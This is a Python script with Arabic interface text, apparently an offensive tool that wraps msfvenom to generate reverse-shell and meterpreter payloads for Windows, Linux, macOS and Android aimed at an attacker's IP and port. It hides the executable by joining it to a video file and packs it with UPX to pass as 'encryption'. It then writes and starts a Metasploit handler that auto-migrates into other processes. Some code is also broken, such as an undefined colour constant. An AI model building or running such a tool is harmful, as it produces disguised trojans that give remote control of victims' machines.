#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
أداة إنشاء بايلودات متقدمة - الإصدار 5.0
مزود بجميع الميزات المطلوبة + واجهة تفاعلية متكاملة
"""

import os
import sys
import time
import random
import subprocess
from shutil import get_terminal_size, make_archive, rmtree, copyfile
import argparse

# ألوان ANSI مخصصة
class Colors:
    RED = '\033[38;5;196m'
    GREEN = '\033[38;5;46m'
    GOLD = '\033[38;5;214m'
    BLUE = '\033[38;5;39m'
    PURPLE = '\033[38;5;129m'
    CYAN = '\033[38;5;51m'
    WHITE = '\033[38;5;255m'
    RESET = '\033[0m'

BANNER = [
    "                     ______                            ___   ",
    "                    (______)                          / __)  ",
    "                     _     _ ____ ____  ____  _____ _| |__   ",
    "                    | |   | / ___)    \|  _ \| ___ (_   __)  ",
    "                    | |__/ / |   | | | | | | | ____| | |     ",
    "                    |_____/|_|   |_|_|_|_| |_|_____) |_|     "
]

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_centered(text, color=Colors.WHITE, padding=None):
    term_width = get_terminal_size().columns
    if padding is None:
        padding = (term_width - len(text)) // 2
    print(' ' * padding + color + text + Colors.RESET)

def animate_banner():
    for i in range(len(BANNER)):
        clear_screen()
        for j, line in enumerate(BANNER[:i+1]):
            color = Colors.GOLD if j == i else Colors.WHITE
            print_centered(line, color)
        time.sleep(0.1)
    
    print_centered("أداة إنشاء بايلودات متقدمة - الإصدار 5.0", Colors.CYAN)
    print_centered("مزود بجميع الميزات الاحترافية", Colors.GREEN)
    time.sleep(1)

def validate_ip(ip):
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(part) <= 255 for part in parts)
    except ValueError:
        return False

def validate_port(port):
    try:
        return 1 <= int(port) <= 65535
    except ValueError:
        return False

def get_user_input():
    """الحصول على مدخلات المستخدم مع التحقق من الصحة"""
    config = {}
    
    while True:
        lhost = input("أدخل عنوان IP المهاجم (LHOST): ")
        if validate_ip(lhost):
            config['lhost'] = lhost
            break
        print_centered("عنوان IP غير صحيح!", Colors.RED)
    
    while True:
        lport = input("أدخل منفذ الاستماع (LPORT): ")
        if validate_port(lport):
            config['lport'] = lport
            break
        print_centered("رقم المنفذ يجب أن يكون بين 1 و 65535", Colors.RED)
    
    config['payload_name'] = input("أدخل اسم للبايلود (بدون مسافات): ").replace(' ', '_')
    config['output_dir'] = f"Payloads/{config['payload_name']}"
    
    # إنشاء مجلد المخرجات
    os.makedirs(config['output_dir'], exist_ok=True)
    
    return config

def select_payload_type():
    """اختيار نوع البايلود"""
    print("\n" + "="*50)
    print_centered("اختر نوع البايلود:", Colors.GOLD)
    types = {
        '1': 'windows/meterpreter/reverse_tcp',
        '2': 'linux/x86/meterpreter/reverse_tcp',
        '3': 'osx/x64/shell_reverse_tcp',
        '4': 'android/meterpreter/reverse_tcp'
    }
    
    for num, ptype in types.items():
        print(f"[{num}] {ptype}")
    
    while True:
        choice = input("اختيارك [1-4]: ")
        if choice in types:
            return types[choice]
        print_centered("اختيار غير صحيح!", Colors.RED)

def generate_payload(config, payload_type):
    """إنشاء البايلود الأساسي"""
    output_file = f"{config['output_dir']}/{config['payload_name']}.exe"
    
    cmd = (
        f"msfvenom -p {payload_type} "
        f"LHOST={config['lhost']} LPORT={config['lport']} "
        f"-f exe -o {output_file}"
    )
    
    print_centered("جاري إنشاء البايلود الأساسي...", Colors.BLUE)
    if subprocess.run(cmd, shell=True).returncode == 0:
        print_centered(f"تم إنشاء البايلود في: {output_file}", Colors.GREEN)
        return output_file
    else:
        print_centered("فشل في إنشاء البايلود!", Colors.RED)
        return None

def merge_with_video(payload_path, config):
    """دمج البايلود مع ملف فيديو"""
    video_file = input("أدخل مسار ملف الفيديو (MP4/AVI): ")
    if not os.path.exists(video_file):
        print_centered("ملف الفيديو غير موجود!", Colors.RED)
        return None
    
    output_file = f"{config['output_dir']}/{config['payload_name']}_video.exe"
    
    # تقنية الدمج باستخدام cat (تعمل على لينكس/ماك)
    if os.name != 'nt':
        cmd = f"cat {payload_path} {video_file} > {output_file}"
        subprocess.run(cmd, shell=True)
        
        # جعل الملف المنفذ
        os.chmod(output_file, 0o755)
        print_centered(f"تم الدمج بنجاح: {output_file}", Colors.GREEN)
        return output_file
    else:
        print_centered("خاصية الدمج غير متاحة على ويندوز!", Colors.RED)
        return None

def create_handler(config):
    """إنشاء ملف handler.rc"""
    rc_file = f"{config['output_dir']}/handler.rc"
    payload_type = "windows/meterpreter/reverse_tcp"  # يمكن تعديله حسب الحاجة
    
    with open(rc_file, 'w', encoding='utf-8') as f:
        f.write(f"""use exploit/multi/handler
set PAYLOAD {payload_type}
set LHOST {config['lhost']}
set LPORT {config['lport']}
set ExitOnSession false
set EnableStageEncoding true
set AutoRunScript post/windows/manage/migrate
run -j
""")
    
    print_centered(f"تم إنشاء ملف الإعداد: {rc_file}", Colors.GREEN)
    return rc_file

def start_listener(rc_file):
    """بدء الاستماع للاتصالات"""
    print_centered("جاري بدء الاستماع للاتصالات...", Colors.BLUE)
    print_centered("استخدم CTRL+C لإيقاف الخادم", Colors.YELLOW)
    
    try:
        subprocess.run(f"msfconsole -r {rc_file}", shell=True)
    except KeyboardInterrupt:
        print_centered("تم إيقاف الخادم", Colors.RED)

def encrypt_payload(payload_path):
    """تشفير البايلود باستخدام UPX"""
    print_centered("جاري تشفير البايلود باستخدام UPX...", Colors.BLUE)
    try:
        subprocess.run(f"upx --best {payload_path}", shell=True)
        print_centered("تم تشفير البايلود بنجاح!", Colors.GREEN)
    except Exception as e:
        print_centered(f"فشل في التشفير: {str(e)}", Colors.RED)

def main():
    try:
        animate_banner()
        
        # التحقق من التبعيات
        if not all(subprocess.run(['which', cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0 
                  for cmd in ['msfvenom', 'upx']):
            print_centered("يجب تثبيت msfvenom و upx أولاً!", Colors.RED)
            return
        
        # الحصول على المدخلات
        config = get_user_input()
        
        # اختيار نوع البايلود
        payload_type = select_payload_type()
        
        # إنشاء البايلود
        payload_path = generate_payload(config, payload_type)
        if not payload_path:
            return
        
        # خيارات إضافية
        if input("هل تريد دمج البايلود مع ملف فيديو؟ [y/n]: ").lower() == 'y':
            merge_with_video(payload_path, config)
        
        if input("هل تريد تشفير البايلود؟ [y/n]: ").lower() == 'y':
            encrypt_payload(payload_path)
        
        # إنشاء وتشغيل ال handler
        rc_file = create_handler(config)
        if input("هل تريد بدء الاستماع الآن؟ [y/n]: ").lower() == 'y':
            start_listener(rc_file)
        
        print_centered("تم الانتهاء بنجاح!", Colors.GREEN)
        print_centered(f"جميع الملفات موجودة في: {config['output_dir']}", Colors.CYAN)
        
    except KeyboardInterrupt:
        print_centered("\nتم إيقاف البرنامج", Colors.RED)
    except Exception as e:
        print_centered(f"حدث خطأ: {str(e)}", Colors.RED)

if __name__ == "__main__":
    main()
